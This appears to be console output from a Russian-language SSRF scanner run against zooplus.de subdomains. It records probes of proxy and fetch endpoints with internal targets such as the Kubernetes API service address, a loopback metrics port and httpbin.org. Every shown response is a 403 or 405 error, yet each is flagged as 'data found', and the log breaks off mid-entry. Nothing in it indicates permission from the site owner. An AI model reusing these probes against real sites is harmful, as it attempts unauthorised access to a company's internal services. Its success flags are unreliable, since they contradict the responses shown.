+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[*] Прогресс: 100/459 тестов выполнено...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://httpbin.org/ip
+Status: 405
+Data preview: {"message": "The method is not allowed for the requested URL."}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[*] Прогресс: 150/459 тестов выполнено...
+[*] Прогресс: 200/459 тестов выполнено...
+[*] Прогресс: 250/459 тестов выполнено...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: integration-www.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
